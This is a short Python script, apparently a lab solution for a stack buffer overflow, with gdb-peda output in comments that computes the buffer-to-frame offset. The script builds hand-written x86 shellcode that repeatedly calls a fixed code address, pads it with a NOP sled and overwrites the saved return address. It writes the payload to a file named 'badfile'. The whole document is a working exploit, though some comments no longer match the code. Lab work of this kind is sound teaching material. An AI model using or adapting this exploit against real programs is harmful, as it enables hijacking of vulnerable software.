# gdb-peda$ p $ebp
# $1 = (void *) 0xffffce08
# gdb-peda$ p &buffer
# $2 = (char (*)[938]) 0xffffca56
# gdb-peda$ p/d 0xce08-0xca56
# $3 = 946
import sys 
# 0x 56 55 62 86
shellcode= ( 
"\xbb\x86\x62\x55\x56" 


"\x6a\x09"
"\x6a\x01"
"\xff\xd3"


"\x31\xc9\x51"
"\x50\xff\xd3" 

"\x6a\x05"
"\x50\xff\xd3" 

"\x31\xc9\x51"
"\x50\xff\xd3" 

"\x6a\x06"
"\x50\xff\xd3" 

"\x6a\x09"
"\x50\xff\xd3" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(2017)) 
# Put the shellcode at the end 
# start = 804 - len(shellcode) 
# content[start:] = shellcode 
content[1800:1800+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffce08 +  600

# for i in range(815-4*10,830, 4):
content[950:954] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

